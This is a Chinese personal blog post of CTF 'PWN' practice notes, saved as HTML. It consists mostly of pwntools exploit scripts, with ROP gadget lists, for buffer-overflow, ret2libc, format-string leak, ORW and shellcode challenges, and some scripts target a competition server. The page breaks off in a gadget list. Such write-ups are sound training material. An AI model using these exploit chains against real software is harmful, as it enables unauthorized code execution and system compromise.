<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PWN刷题笔记（长期更新） | Zechariahの博客</title><meta name="author" content="Zechariah"><meta name="copyright" content="Zechariah"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="GHCTFHello_World绕PIEfrom pwn import * context.log_level&#x3D;&#39;debug&#39; p &#x3D; process(&#39;.&#x2F;attachment&#39;) offset&#x3D;40 backdoor &#x3D; b&quot;\xC5&quot; payload &#x3D; b&quot;A&amp;quot">
<meta property="og:type" content="article">
<meta property="og:title" content="PWN刷题笔记（长期更新）">
<meta property="og:url" content="https://zechariah-0703.github.io/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/index.html">
<meta property="og:site_name" content="Zechariahの博客">
<meta property="og:description" content="GHCTFHello_World绕PIEfrom pwn import * context.log_level&#x3D;&#39;debug&#39; p &#x3D; process(&#39;.&#x2F;attachment&#39;) offset&#x3D;40 backdoor &#x3D; b&quot;\xC5&quot; payload &#x3D; b&quot;A&amp;quot">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://zechariah-0703.github.io/img/fengmian.png">
<meta property="article:published_time" content="2025-03-25T13:39:37.000Z">
<meta property="article:modified_time" content="2025-03-25T17:22:31.800Z">
<meta property="article:author" content="Zechariah">
<meta property="article:tag" content="PWN">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://zechariah-0703.github.io/img/fengmian.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://zechariah-0703.github.io/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'PWN刷题笔记（长期更新）',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-03-26 01:22:31'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><script src="/live2d-widget/autoload.js"></script><meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/loading.gif" data-original="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/fengmian.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Zechariahの博客"><span class="site-name">Zechariahの博客</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">PWN刷题笔记（长期更新）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-03-25T13:39:37.000Z" title="发表于 2025-03-25 21:39:37">2025-03-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-03-25T17:22:31.800Z" title="更新于 2025-03-26 01:22:31">2025-03-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="PWN刷题笔记（长期更新）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="GHCTF"><a href="#GHCTF" class="headerlink" title="GHCTF"></a>GHCTF</h2><h3 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello_World"></a>Hello_World</h3><p>绕PIE<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
context.log_level&#x3D;&#39;debug&#39;
p &#x3D; process(&#39;.&#x2F;attachment&#39;)
offset&#x3D;40
backdoor &#x3D; b&quot;\xC5&quot;
payload &#x3D; b&quot;A&quot; * offset + backdoor
p.send(payload)
p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h3><p><img src="/img/loading.gif" data-original="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250314192604.png" alt="Pasted image 20250314192604"><br><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)
context.terminal &#x3D; [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;] 

p&#x3D;process(&quot;.&#x2F;attachment&quot;)
elf&#x3D;ELF(&#39;.&#x2F;attachment&#39;)
libc&#x3D;ELF(&#39;.&#x2F;libc.so.6&#39;)

def manu(choice):
    p.sendlineafter(&#39;money\n&#39;,str(choice))

def flowers(kind,num):
    manu(1)
    p.sendlineafter(&#39;20\n&#39;,str(kind))
    &#39;&#39;&#39;
    1.peony $10
    2.rose $100
    3.fragrans $20
    &#39;&#39;&#39;
    p.sendlineafter(&#39;buy?\n&#39;,str(num))


def hell_money(count):
        p.sendline(b&#39;3&#39;)
        p.sendline(str(count).encode(&#39;utf-8&#39;))


def see_it(count):
        p.sendline(b&#39;7&#39;)
        p.sendline(str(count).encode(&#39;utf-8&#39;))


hell_money(100)
pause()
see_it(10000)
pause()
p.sendline(b&#39;5&#39;)
#0x0000000000400579 : ret
ret&#x3D;0x0000000000400579
pop_rdi &#x3D; 0x0000000000400d73
puts_plt &#x3D; elf.plt[&#39;puts&#39;]
puts_got &#x3D; elf.got[&#39;puts&#39;]
main &#x3D; 0x0000000000400B1E
payload &#x3D; b&#39;A&#39;*0x48  +p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)

pause()
p.sendline(payload)
pause()
p.recvuntil(b&#39;it!!!\n&#39;)
puts_addr &#x3D; p.recvline()[:6]
puts_addr &#x3D; u64(puts_addr.ljust(8,b&#39;\x00&#39;))
libc_base &#x3D; puts_addr - libc.symbols[&#39;puts&#39;]
success(&#39;libc_base--&gt;&#39;+hex(libc_base))
system &#x3D; libc_base + libc.symbols[&#39;system&#39;]

binsh &#x3D; libc_base + next(libc.search(b&#39;&#x2F;bin&#x2F;sh&#39;))
success(&#39;system--&gt;&#39;+hex(system))

payload &#x3D; b&#39;A&#39;*0x48  +p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendline(payload)
pause()
p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h3><p><img src="/img/loading.gif" data-original="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250313130300.png" alt="Pasted image 20250313130300"><br><img src="/img/loading.gif" data-original="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250313130240.png" alt="Pasted image 20250313130240"><br><img src="/img/loading.gif" data-original="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250313132719.png" alt="Pasted image 20250313132719"><br><img src="/img/loading.gif" data-original="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250313132731.png" alt="Pasted image 20250313132731"><img src="/img/loading.gif" data-original="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250313135230.png" alt="Pasted image 20250313135230"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)
context.terminal &#x3D; [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;] 

p&#x3D;process(&quot;.&#x2F;ret2libc2&quot;)
elf&#x3D;ELF(&#39;.&#x2F;ret2libc2&#39;)
libc&#x3D;ELF(&#39;.&#x2F;libc.so.6&#39;)
offset &#x3D; 0x30

rbp_ret &#x3D; 0x40117d
ret &#x3D; 0x40101a
bss &#x3D; 0x4044e8
printf&#x3D;0x401227

payload1&#x3D;b&#39;A&#39;*(offset-5) + b&#39;%27$p&#39; + p64(bss+0x400)+p64(printf)

p.sendlineafter(&#39;magic\n&#39;,payload1)
p.recvuntil(b&#39;A&#39;*(offset-5))
address&#x3D;p.recvuntil(b&#39;\xe8&#39;,drop&#x3D;True)
address&#x3D;int(address,16)
success(hex(address))

libc_addr &#x3D; address - libc.symbols[&#39;__libc_start_main&#39;]-128
success(hex(libc_addr))

rdi&#x3D;0x2a3e5+libc_addr
binsh&#x3D;libc_addr + next(libc.search(b&#39;&#x2F;bin&#x2F;sh&#39;))
rsi&#x3D;0x2be51+libc_addr
system&#x3D;libc.symbols[&#39;system&#39;]+libc_addr


payload &#x3D; b&#39;a&#39;*0x30+ p64(bss+0x500) 
payload+&#x3D; p64(rdi)+ p64(binsh)+ p64(system)
p.sendafter(&#39;magic&#39;,payload)
p.interactive()

&#39;&#39;&#39;
0xebc81 execve(&quot;&#x2F;bin&#x2F;sh&quot;, r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] &#x3D;&#x3D; NULL || r10 &#x3D;&#x3D; NULL || r10 is a valid argv
  [[rbp-0x70]] &#x3D;&#x3D; NULL || [rbp-0x70] &#x3D;&#x3D; NULL || [rbp-0x70] is a valid envp

0xebc85 execve(&quot;&#x2F;bin&#x2F;sh&quot;, r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] &#x3D;&#x3D; NULL || r10 &#x3D;&#x3D; NULL || r10 is a valid argv
  [rdx] &#x3D;&#x3D; NULL || rdx &#x3D;&#x3D; NULL || rdx is a valid envp

0xebc88 execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] &#x3D;&#x3D; NULL || rsi &#x3D;&#x3D; NULL || rsi is a valid argv
  [rdx] &#x3D;&#x3D; NULL || rdx &#x3D;&#x3D; NULL || rdx is a valid envp

0xebce2 execve(&quot;&#x2F;bin&#x2F;sh&quot;, rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  r13 &#x3D;&#x3D; NULL || &#123;&quot;&#x2F;bin&#x2F;sh&quot;, r13, NULL&#125; is a valid argv
  [r12] &#x3D;&#x3D; NULL || r12 &#x3D;&#x3D; NULL || r12 is a valid envp

0xebd38 execve(&quot;&#x2F;bin&#x2F;sh&quot;, rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  r12 &#x3D;&#x3D; NULL || &#123;&quot;&#x2F;bin&#x2F;sh&quot;, r12, NULL&#125; is a valid argv
  [[rbp-0x70]] &#x3D;&#x3D; NULL || [rbp-0x70] &#x3D;&#x3D; NULL || [rbp-0x70] is a valid envp

0xebd3f execve(&quot;&#x2F;bin&#x2F;sh&quot;, rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  rax &#x3D;&#x3D; NULL || &#123;rax, r12, NULL&#125; is a valid argv
  [[rbp-0x70]] &#x3D;&#x3D; NULL || [rbp-0x70] &#x3D;&#x3D; NULL || [rbp-0x70] is a valid envp

0xebd43 execve(&quot;&#x2F;bin&#x2F;sh&quot;, rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax &#x3D;&#x3D; NULL || &#123;rax, [rbp-0x48], NULL&#125; is a valid argv
  [[rbp-0x70]] &#x3D;&#x3D; NULL || [rbp-0x70] &#x3D;&#x3D; NULL || [rbp-0x70] is a valid envp
&#39;&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="hopper"><a href="#hopper" class="headerlink" title="hopper"></a>hopper</h3><p><img src="/img/loading.gif" data-original="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250315150516.png" alt="Pasted image 20250315150516"><br><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *  
p &#x3D; process(&#39;.&#x2F;Hopper&#39;)  
  
pop_rsi &#x3D; 0x401017  
syscall &#x3D; 0x40100A  
xchg &#x3D; 0x40100C  
pop_r15&#x3D;0x40101C  
  
gdb.attach(p)  
pause()  
p.recvuntil(b&#39;    (&quot; ~----( ~   Y.  )\n&#39;)  
a &#x3D; p.recvline()[:6]  
a &#x3D; int.from_bytes(a,&#39;little&#39;)  
print(&quot;---&gt;&quot;,hex(a))  
payload &#x3D; p64(pop_r15)+p64(pop_rsi)+p64(0)  
payload +&#x3D; p64(a+0x28) + p64(0)  
payload +&#x3D; p64(59) + p64(syscall)  
payload +&#x3D; p64(0x401021)+ b&#39;&#x2F;bin&#x2F;sh\x00&#39;  
p.sendline(payload)  
p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="NPC2CTF"><a href="#NPC2CTF" class="headerlink" title="NPC2CTF"></a><strong>NPC2CTF</strong></h2><h3 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h3><h4 id="ORW（Day1-25-2-23）"><a href="#ORW（Day1-25-2-23）" class="headerlink" title="ORW（Day1 25/2/23）"></a>ORW（Day1 25/2/23）</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_79880074/article/details/136008071">格式化字符串漏洞的两种利用姿势+orw沙盒利用_格式化字符串泄露canary-CSDN博客</a><br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x000000000002be51 : pop rsi ; ret
0x0000000000035dd1 : pop rbx ; ret
0x000000000002be51 : pop rsi ; ret
0x0000000000045eb0 : pop rax ; ret
0x000000000002a3e5 : pop rdi ; ret
0x00000000000904a9 : pop rdx ; pop rbx ; ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><code>ROPgadget --binary libc.so.6 --only &quot;pop|ret&quot; |grep &quot;rax&quot;</code><br><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)
context.terminal &#x3D; [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]  

elf&#x3D;ELF(&#39;.&#x2F;orw&#39;)
libc&#x3D;ELF(&#39;.&#x2F;libc.so.6&#39;)
context(log_level&#x3D;&#39;debug&#39;,arch&#x3D;&#39;amd64&#39;)

# p&#x3D;process(&#39;.&#x2F;orw&#39;)
p&#x3D;remote(&#39;175.27.249.18&#39;,31548)
p.recvuntil(&#39;0x&#39;)
libc.address&#x3D;int(p.recv(12),16)-libc.sym[&#39;printf&#39;]
log.success(&#39;libc &#x3D; &#39;+hex(libc.address))

rsi&#x3D;0x000000000002be51+libc.address
rdi&#x3D;0x000000000002a3e5+libc.address
rdx_rbx&#x3D;0x00000000000904a9+libc.address
&#39;&#39;&#39;
0x000000000002be51 : pop rsi ; ret
0x0000000000035dd1 : pop rbx ; ret
0x0000000000045eb0 : pop rax ; ret
0x00000000000904a9 : pop rdx ; pop rbx ; ret
0x000000000002a3e5
&#39;&#39;&#39;
read&#x3D;libc.sym[&#39;read&#39;]
puts&#x3D;libc.sym[&#39;puts&#39;]
syscall&#x3D;libc.sym[&#39;syscall&#39;]
bss&#x3D;0x403400

payload&#x3D;b&#39;A&#39;*88
#调用read(0, bss_addr, 4)读入&quot;flag&quot;
payload+&#x3D;p64(rdi)+p64(0)+p64(rsi)+p64(bss)+p64(rdx_rbx)+p64(8)+p64(0)+p64(read)
#调用syscall(2,bss,0)
payload+&#x3D;p64(rdi)+p64(2)+p64(rsi)+p64(bss)+p64(rdx_rbx)+p64(0)+p64(0)+p64(syscall)
#read(3(文件), bss, 0x100)
payload+&#x3D;p64(rdi)+p64(3)+p64(rsi)+p64(bss)+p64(rdx_rbx)+p64(0x100)+p64(0)+p64(read)
#puts(bss)
payload+&#x3D;p64(rdi)+p64(bss)+p64(puts)

p.sendline(payload)
p.sendline(b&#39;&#x2F;flag\x00&#39;)
p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h4 id="simple-shellcode（Day0-25-2-22）"><a href="#simple-shellcode（Day0-25-2-22）" class="headerlink" title="simple_shellcode（Day0 25/2/22）"></a>simple_shellcode（Day0 25/2/22）</h4><h5 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)
sh &#x3D; remote(&#39;175.27.249.18&#39;, 30369)
shellcode &#x3D; asm(shellcraft.sh()) #生成并汇编shellcode

sh.sendafter(&#39;plz: &#39;, shellcode)
sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;env python3
from pwncli import *

context.terminal &#x3D; [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;, &quot;-l&quot;, &quot;122&quot;]
local_flag &#x3D; sys.argv[1] if len(sys.argv) &#x3D;&#x3D; 2 else 0

if local_flag &#x3D;&#x3D; &quot;remote&quot;:
    addr &#x3D; &#39;175.27.249.18 30924&#39;
    host &#x3D; addr.split(&#39; &#39;)
    gift.io &#x3D; remote(host[0], host[1])
    gift.remote &#x3D; True
else:
    gift.io &#x3D; process(&#39;.&#x2F;pwn1&#39;)
    if local_flag &#x3D;&#x3D; &quot;nodbg&quot;:
        gift.remote &#x3D; True
init_x64_context(gift.io, gift)
libc &#x3D; load_libc(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)
elf &#x3D; gift.elf &#x3D; ELF(&#39;.&#x2F;pwn1&#39;)
cmd &#x3D; &#39;&#39;&#39;
&#39;&#39;&#39;

launch_gdb(cmd)

ru(b&#39;Shellcode plz: &#39;)

shellcode &#x3D; &#39;&#39;&#39;
pop rax
pop rax
add qword ptr [rsp], 0x30
mov rsp, qword ptr [rsp]
mov rdi, 1
mov rsi, 0x424030
mov rdx, 0x8
mov qword ptr [rbp + 0x8], 0x4011FA
ret
&#39;&#39;&#39;

leave_ret &#x3D; 0x4012CB
payload &#x3D; p64(elf.plt.write) + p64(leave_ret)

s(asm(shellcode).ljust(0x30, b&#39;\x90&#39;) + payload)

libc_base &#x3D; u64_ex(r(8)) - 0x11EA10
set_current_libc_base_and_log(libc_base)

shellcode &#x3D; f&#39;&#39;&#39;
mov rdi, &#123;next(libc.search(b&quot;&#x2F;bin&#x2F;sh&quot;)):#x&#125;
mov rsi, &#123;libc.sym.system:#x&#125;
add rsp, 0x8
jmp rsi
&#39;&#39;&#39;
s(asm(shellcode))

ia()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="EZ-Stack（Day1-25-2-23）"><a href="#EZ-Stack（Day1-25-2-23）" class="headerlink" title="EZ_Stack（Day1 25/2/23）"></a>EZ_Stack（Day1 25/2/23）</h4><p><img src="/img/loading.gif" data-original="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250217193308.png" alt="Pasted image 20250217193308">开了NX<br><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;也许有用的gadget
0x000000000040117d : pop rbp ; ret
0x0000000000401203 : pop rdi ; ret
0x000000000040101a : ret
0x000000000040103a : jmp 0x401020
0x0000000000401194 : jmp 0x401120
0x000000000040100b : jmp 0x4840103f
0x0000000000401217 : jmp 0x48401229
0x000000000040110c : jmp rax
0x000000000040101a : ret

